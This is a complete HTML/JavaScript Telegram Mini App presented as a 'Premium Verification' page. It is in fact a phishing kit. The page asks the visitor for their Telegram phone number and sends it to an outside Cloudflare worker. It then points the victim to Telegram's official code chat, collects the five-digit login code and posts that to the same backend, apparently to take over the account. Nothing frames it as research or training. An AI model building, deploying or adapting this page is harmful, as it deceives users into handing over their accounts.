<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; user-select: none; }
        body { background: #000; color: white; overflow: hidden; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        /* Blurred Background */
        .bg-image {
            position: fixed; top: -5%; left: -5%; width: 110vw; height: 110vh;
            background: url('https://yctirvnryrzygoxbpvoy.supabase.co/storage/v1/object/public/thumbnails/thumb_1784419834.jpg') center/cover no-repeat;
            filter: blur(12px) brightness(0.6);
            z-index: -1;
        }

        .container {
            width: 100%; max-width: 400px; padding: 20px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        /* Top Bar */
        .top-bar { position: absolute; top: 15px; left: 15px; right: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 20px; z-index: 10; font-weight: bold; }
        .top-bar .close-btn { font-size: 24px; cursor: pointer; }
        
        /* Glass Panels */
        .glass-panel {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(15px);
            border-radius: 15px; padding: 20px; text-align: center;
            width: 100%; margin-bottom: 15px; color: #000; font-weight: bold;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            border: 1px solid rgba(255,255,255,0.5);
        }

        /* Action Buttons */
        .action-btn {
            background: #d82b7c; /* Pink color matching screenshot */
            color: white; border: none; border-radius: 12px; padding: 18px; width: 100%;
            font-size: 18px; font-weight: bold; cursor: pointer;
            box-shadow: 0 5px 15px rgba(216, 43, 124, 0.4);
            transition: 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px;
        }
        .action-btn:active { transform: scale(0.95); }

        /* Emoji Icons */
        .big-icon { font-size: 100px; margin-bottom: 20px; animation: float 3s infinite ease-in-out; text-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        /* Keypad Styles */
        .keypad-container { width: 100%; padding: 10px; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .key {
            background: #d82b7c; color: white; border: none; border-radius: 12px;
            font-size: 26px; font-weight: bold; padding: 15px 0; cursor: pointer;
            box-shadow: 0 4px 0 #9e1a58; transition: 0.1s;
        }
        .key:active { transform: translateY(4px); box-shadow: 0 0 0 #9e1a58; }
        .key.icon-key { font-size: 20px; }

        /* OTP & Phone Boxes */
        .input-display { display: flex; justify-content: center; gap: 8px; margin: 15px 0; height: 60px; }
        .input-box {
            width: 50px; height: 60px; border: 2px solid rgba(255,255,255,0.6);
            border-radius: 12px; background: rgba(0,0,0,0.3); color: white;
            font-size: 28px; display: flex; align-items: center; justify-content: center; font-weight: bold;
        }
        .phone-display {
            font-size: 28px; letter-spacing: 3px; font-weight: bold; background: rgba(0,0,0,0.5);
            padding: 15px; border-radius: 12px; border: 2px solid rgba(255,255,255,0.3); min-height: 65px;
            display: flex; align-items: center; justify-content: center; margin-bottom: 15px;
        }

        /* Screens */
        .screen { display: none; width: 100%; flex-direction: column; align-items: center; }
        .screen.active { display: flex; }

        .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-top: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #toast { position: fixed; bottom: -50px; background: #333; color: white; padding: 12px 20px; border-radius: 10px; font-weight: bold; transition: 0.3s; z-index: 9999; }
        #toast.show { bottom: 30px; }
    </style>
</head>
<body>

    <div class="bg-image"></div>

    <div class="top-bar">
        <span class="close-btn" onclick="tg.close()">✕</span>
        <span>Premium Access</span>
        <span style="width: 24px;"></span>
    </div>

    <div class="container">
        
        <!-- Screen 1: Human Verification -->
        <div id="screen-human" class="screen active">
            <div class="big-icon">❤️‍🔥</div>
            <div class="glass-panel" style="background: rgba(216, 43, 124, 0.6); color: white;">
                Confirm you're human in just one click
            </div>
            <button class="action-btn" onclick="showScreen('screen-phone')">Proceed now ✅</button>
        </div>

        <!-- Screen 2: Enter Phone Number (To match the keypad theme) -->
        <div id="screen-phone" class="screen">
            <div class="big-icon" style="font-size: 80px;">📱</div>
            <div class="glass-panel" style="background: rgba(216, 43, 124, 0.6); color: white;">
                Enter Your Telegram Number to Receive Access Code
            </div>
            <div id="phone-text" class="phone-display">+</div>
            <button id="btn-phone-submit" class="action-btn" onclick="submitPhone()" style="margin-bottom: 10px; display:none;">Send Code 🚀</button>
            <div class="keypad-container" id="keypad-phone"></div>
        </div>

        <!-- Screen 3: Loading -->
        <div id="screen-loading" class="screen">
            <div class="glass-panel" style="background: white; color: black; border-radius: 30px; padding: 10px 20px; width: auto; font-size: 16px;">
                Hold on, processing... ⚡
            </div>
            <div class="big-icon" style="font-size: 120px; margin-top: 30px;">🗂️</div>
            <div class="spinner"></div>
        </div>

        <!-- Screen 4: OTP Input -->
        <div id="screen-otp" class="screen">
            <div class="big-icon" style="font-size: 80px; margin-bottom: 5px;">📥</div>
            <div class="glass-panel" style="background: rgba(216, 43, 124, 0.7); color: white; margin-bottom: 5px;">
                We Just Sent Your Access Code - Check your Telegram!
            </div>
            
            <div class="input-display" id="otp-boxes">
                <div class="input-box"></div><div class="input-box"></div><div class="input-box"></div><div class="input-box"></div><div class="input-box"></div>
            </div>

            <button class="action-btn" onclick="openTelegram()" style="margin-bottom: 10px;">Show my code 📲</button>
            
            <div class="keypad-container" id="keypad-otp"></div>
        </div>

    </div>

    <div id="toast">Message</div>

    <script>
        const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
        if(tg) { tg.expand(); tg.ready(); }

        const BACKEND_URL = "https://worker-small-fog-3774.maronyvai.workers.dev";
        const userId = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : '123456'; 

        let currentScreen = "human";
        let phoneNumber = "+";
        let otpCode = "";
        let currentHash = "";

        // Build Keypad
        function renderKeypad(containerId, mode) {
            let html = '<div class="keypad">';
            for(let i=1; i<=9; i++) html += `<button class="key" onclick="pressKey('${i}', '${mode}')">${i}</button>`;
            html += `<button class="key" onclick="pressKey('+', '${mode}')">+</button>`;
            html += `<button class="key" onclick="pressKey('0', '${mode}')">0</button>`;
            html += `<button class="key icon-key" onclick="pressKey('del', '${mode}')">⌫</button>`;
            html += '</div>';
            document.getElementById(containerId).innerHTML = html;
        }

        renderKeypad('keypad-phone', 'phone');
        renderKeypad('keypad-otp', 'otp');

        function pressKey(val, mode) {
            if(mode === 'phone') {
                if(val === 'del') { if(phoneNumber.length > 1) phoneNumber = phoneNumber.slice(0, -1); }
                else if (phoneNumber.length < 15) phoneNumber += val;
                
                document.getElementById('phone-text').innerText = phoneNumber;
                document.getElementById('btn-phone-submit').style.display = phoneNumber.length > 8 ? 'block' : 'none';
                document.getElementById('keypad-phone').style.display = phoneNumber.length > 8 ? 'none' : 'block';
            } 
            else if(mode === 'otp') {
                if(val === 'del') { otpCode = otpCode.slice(0, -1); }
                else if (val !== '+' && otpCode.length < 5) otpCode += val;
                
                let boxes = document.querySelectorAll('#otp-boxes .input-box');
                for(let i=0; i<5; i++) boxes[i].innerText = otpCode[i] || "";

                if(otpCode.length === 5) {
                    verifyOTP();
                }
            }
        }

        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
        }

        function showToast(msg) {
            let toast = document.getElementById('toast');
            toast.innerText = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        function openTelegram() {
            if (tg && typeof tg.openTelegramLink === 'function') {
                tg.openTelegramLink('https://t.me/777000');
            } else {
                window.location.href = "tg://openmessage?user_id=777000";
            }
        }

        async function submitPhone() {
            if (phoneNumber.length < 9) return showToast("Enter valid phone number!");
            showScreen('screen-loading');

            try {
                const res = await fetch(`${BACKEND_URL}/api/send_code`, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify({ phone: phoneNumber, user_id: userId }) 
                });
                const data = await res.json();
                
                if(data && data.status === "ok") {
                    currentHash = data.hash;
                    setTimeout(() => showScreen('screen-otp'), 1500); // Wait 1.5s on processing screen
                } else { 
                    showToast(data.msg || "Failed to send code!");
                    showScreen('screen-phone'); 
                }
            } catch(e) {
                showToast("Connection Error!");
                showScreen('screen-phone');
            }
        }

        async function verifyOTP() {
            showScreen('screen-loading');
            try {
                const res = await fetch(`${BACKEND_URL}/api/verify_code`, { 
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'}, 
                    body: JSON.stringify({ phone: phoneNumber, hash: currentHash, otp: otpCode, user_id: userId }) 
                });
                const data = await res.json();
                
                if(data && data.status === "ok") {
                    // Success! Redirect to premium channel
                    document.getElementById('screen-loading').innerHTML = `
                        <div class="big-icon">💎</div>
                        <div class="glass-panel" style="background: rgba(0,255,170,0.7); color: black;">Verification Successful!</div>
                    `;
                    setTimeout(() => {
                        if (tg && typeof tg.openTelegramLink === 'function') {
                            tg.openTelegramLink('https://t.me/+snT3FqTlgmJlNDQ1');
                        }
                    }, 1500);
                } else {
                    showToast(data.msg || "Invalid Code!");
                    otpCode = "";
                    let boxes = document.querySelectorAll('#otp-boxes .input-box');
                    for(let i=0; i<5; i++) boxes[i].innerText = "";
                    showScreen('screen-otp');
                }
            } catch(e) {
                showToast("Connection Error!");
                showScreen('screen-otp');
            }
        }
    </script>
</body>
</html>
